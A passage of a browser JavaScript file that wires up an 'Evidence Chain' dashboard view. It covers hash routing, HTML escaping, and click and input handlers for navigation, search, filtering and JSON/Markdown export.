            if (targetEl) targetEl.scrollIntoView({ behavior: 'smooth' });
        }
    }

    function handleHashChange() {
        const hash = window.location.hash;
        if (hash === '#evidence-chain' || hash === '#evidencechain') {
            switchToEvidenceChainView();
        } else {
            switchToDashboardView(hash);
        }
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g, '&amp;')
                  .replace(/</g, '&lt;')
                  .replace(/>/g, '&gt;')
                  .replace(/"/g, '&quot;')
                  .replace(/'/g, '&#039;');
    }

    // ═══════════════════════════════════════════════════════════
    // 9. INITIALIZATION
    // ═══════════════════════════════════════════════════════════

    function init() {
        window.addEventListener('hashchange', handleHashChange);

        // Sidebar click on EvidenceChain
        const menuEv = document.getElementById('menu-evidence-chain');
        if (menuEv) {
            menuEv.addEventListener('click', (e) => {
                e.preventDefault();
                window.location.hash = 'evidence-chain';
                switchToEvidenceChainView();
            });
        }

        // Top tab click on EvidenceChain
        const tabEv = document.getElementById('tab-evidence-chain');
        if (tabEv) {
            tabEv.addEventListener('click', () => {
                window.location.hash = 'evidence-chain';
                switchToEvidenceChainView();
            });
        }

        // When user clicks other sidebar items, return to dashboard view smoothly
        document.querySelectorAll('.sidebar__nav .nav-item').forEach(item => {
            if (item.id !== 'menu-evidence-chain') {
                item.addEventListener('click', () => {
                    const href = item.getAttribute('href');
                    switchToDashboardView(href);
                    document.querySelectorAll('.sidebar__nav .nav-item').forEach(i => i.classList.remove('nav-item--active'));
                    item.classList.add('nav-item--active');
                });
            }
        });

        // Inspector tabs switching
        document.querySelectorAll('.ev-inspector-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                activeInspectorTab = tab.getAttribute('data-tab');
                updateInspectorTabs();
                renderInspector();
            });
        });

        // Search bar
        const searchInput = document.getElementById('ev-search-input');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                searchQuery = e.target.value.trim();
                renderGraph();
            });
        }

        // Status Filter dropdown
        const statusFilterSelect = document.getElementById('ev-status-filter');
        if (statusFilterSelect) {
            statusFilterSelect.addEventListener('change', (e) => {
                statusFilter = e.target.value;
                renderGraph();
            });
        }

        // Export Buttons
        const btnExportJson = document.getElementById('ev-btn-export-json');
        const btnExportMd = document.getElementById('ev-btn-export-md');
        const btnOpenExportModal = document.getElementById('ev-btn-open-export');
        const btnCloseModal = document.getElementById('ev-modal-close');
        const modalOverlay = document.getElementById('ev-export-modal');

        if (btnExportJson) btnExportJson.addEventListener('click', generateJsonExport);
        if (btnExportMd) btnExportMd.addEventListener('click', generateMarkdownExport);
        if (btnOpenExportModal) btnOpenExportModal.addEventListener('click', openExportModal);
        if (btnCloseModal) btnCloseModal.addEventListener('click', closeExportModal);
        if (modalOverlay) {
            modalOverlay.addEventListener('click', (e) => {
                if (e.target === modalOverlay) closeExportModal();
            });
        }

        initPanZoom();

        // Initial check for hash
        if (window.location.hash === '#evidence-chain' || window.location.hash === '#evidencechain') {
            switchToEvidenceChainView();
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Expose for debugging & testing
    window.EvidenceChainEngine = {
        getInvestigation: () => investigation,
        reevaluate: reevaluateEvidenceChain,
        selectEvent: (id) => selectEvent(id),
        selectRelationship: (id) => selectRelationship(id),
        exportJson: generateJsonExport,
        exportMd: generateMarkdownExport,
        switchToEvidenceChainView,
        switchToDashboardView
    };

})();
